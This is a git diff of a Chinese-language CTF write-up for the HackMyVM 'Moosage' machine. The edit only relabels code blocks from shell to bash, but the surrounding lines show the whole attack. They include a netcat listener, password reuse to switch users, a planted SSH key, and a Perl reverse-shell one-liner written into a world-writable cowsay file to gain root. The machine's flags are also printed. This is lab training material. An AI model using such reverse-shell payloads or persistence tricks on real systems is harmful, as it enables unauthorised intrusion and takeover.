@@ -276,7 +276,7 @@ Content-Length: 56
 
 ## User - www-data
 
-```shell
+```bash
 ┌─[randark@parrot]─[~]
 └──╼ $ nc -lvnp 9999
 listening on [any] 9999 ...
@@ -318,7 +318,7 @@ MariaDB [moosage]> select * from images,posts;
 
 使用上文发现的 mysql 凭据进行登录
 
-```shell
+```bash
 (remote) www-data@moosage:/var/www/html/blog/data/i$ su baca
 Password:
 baca@moosage:/var/www/html/blog/data/i$ whoami
@@ -327,7 +327,7 @@ baca
 
 ### flag - user
 
-```shell
+```bash
 baca@moosage:~$ cat user.txt
 hmvmessageme
 ```
@@ -336,7 +336,7 @@ hmvmessageme
 
 首先，创建文件夹，并写入 `authorized_keys` 文件
 
-```shell
+```bash
 (remote) baca@moosage:/home/baca$ mkdir .ssh
 (remote) baca@moosage:/home/baca$ chmod 700 .ssh
 (remote) baca@moosage:/home/baca$ nano .ssh/authorized_keys
@@ -346,7 +346,7 @@ hmvmessageme
 
 随后尝试进行连接
 
-```shell
+```bash
 ┌─[randark@parrot]─[~]
 └──╼ $ ssh baca@192.168.56.126
  ___________________________
@@ -379,7 +379,7 @@ baca
 
 查看 `Cowsay` 程序的脚本路径 `/usr/share/cowsay/cows`
 
-```shell
+```bash
 -rw-rw-rw- 1 root root  115 Feb  3  2019 apt.cow
 -rw-rw-rw- 1 root root  310 Aug 14  1999 bud-frogs.cow
 -rw-rw-rw- 1 root root  123 Aug 14  1999 bunny.cow
@@ -440,7 +440,7 @@ baca
 
 :::
 
-```shell
+```bash
 (remote) baca@moosage:/usr/share/cowsay/cows$ echo "" > cower.cow
 (remote) baca@moosage:/usr/share/cowsay/cows$ echo 'use Socket;$i="192.168.56.102";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};' > cower.cow
 (remote) baca@moosage:/usr/share/cowsay/cows$ cat cower.cow
@@ -449,13 +449,13 @@ use Socket;$i="192.168.56.102";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyna
 
 然后启动 SSH 会话
 
-```shell
+```bash
 ssh baca@192.168.56.126
 ```
 
 成功收到回连的 shell
 
-```shell
+```bash
 ┌─[randark@parrot]─[~]
 └──╼ $ pwncat-cs -lp 1234
 [19:53:32] Welcome to pwncat 🐈!
@@ -468,7 +468,7 @@ root
 
 ### flag - user
 
-```shell
+```bash
 (remote) root@moosage:/root# cat root.txt
 hmvyougotmooooooo
 ```
